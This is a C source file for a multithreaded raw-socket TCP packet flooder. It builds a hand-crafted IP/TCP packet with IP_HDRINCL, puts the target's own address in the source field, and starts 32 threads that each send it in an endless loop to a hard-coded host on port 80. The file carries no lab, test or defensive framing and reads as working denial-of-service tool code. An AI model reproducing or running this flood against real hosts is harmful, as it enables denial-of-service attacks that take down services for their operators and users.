#include "network.h"

#define PORT 80

char datagram[9000];

struct t_data {
	int sockfd;
	char *datagram;
	uint16_t len;
	struct sockaddr_in sin;
};

const char target_address[] = "10.17.41.107";

void *ThreadProcess(void *arg){
	struct t_data *tData = (struct t_data *) arg;

	while (1)
	{
		//Send the packet
		if (sendto (tData->sockfd,		/* our socket */
					tData->datagram,	/* the buffer containing headers and data */
					tData->len,	/* total length of our datagram */
					0,		/* routing flags, normally always 0 */
					(struct sockaddr *) &tData->sin,	/* socket addr, just like in */
					sizeof (tData->sin)) < 0)		/* a normal send() */
		{
			printf ("error\n");
		}
		//Data send successfully
		else
		{
			printf ("Packet Send %d\n", tData->len);
		}
	}

	pthread_exit(0);
}

int main(const int argc, const char *argv[]) {
	const int threads = 32;

	// Array's for thread memory
    pthread_t tid[threads];
    struct t_data threadData[threads];

    // Gather thread attributes for thread creation
    pthread_attr_t attr;
	pthread_attr_init(&attr);

    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);

    struct pseudo_header psh;
    struct sockaddr_in sin;
    struct iphdr *iph;
    struct tcphdr *tcph;

    iph = (struct iphdr *)datagram;
    tcph = (struct tcphdr *) (datagram + sizeof(struct iphdr));

    CreateSockaddr(&sin, PORT, AF_INET, target_address);
    CreateArpHeader(iph, IPPROTO_TCP, sin.sin_addr.s_addr);
    CreateTcpHeader(tcph, PORT);

    iph->check = csum((unsigned short *) datagram, iph->tot_len >> 1);

    psh.source_address = inet_addr( target_address );
	psh.dest_address = sin.sin_addr.s_addr;
	psh.placeholder = 0;
	psh.protocol = IPPROTO_TCP;
	psh.tcp_length = htons(20);

    memcpy(&psh.tcp , tcph , sizeof (struct tcphdr));

    tcph->check = csum( (unsigned short*) &psh , sizeof (struct pseudo_header));

    int one = 1;
	const int *val = &one;
	if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
	{
		printf ("Error setting IP_HDRINCL. Error number : %d . Error message : %s \n" , errno , strerror(errno));
		exit(0);
	}

	for(int i = 0; i < threads; i++) {
        threadData[i].datagram = datagram;
        threadData[i].len = iph->tot_len;
		threadData[i].sin = sin;
		threadData[i].sockfd = s;

        pthread_create(&tid[i], &attr, ThreadProcess, &threadData[i]);
	}

	for(int i = 0; i < threads; i++) {
        pthread_join(tid[i], NULL);
	}

    close(s);
    exit(EXIT_SUCCESS);
}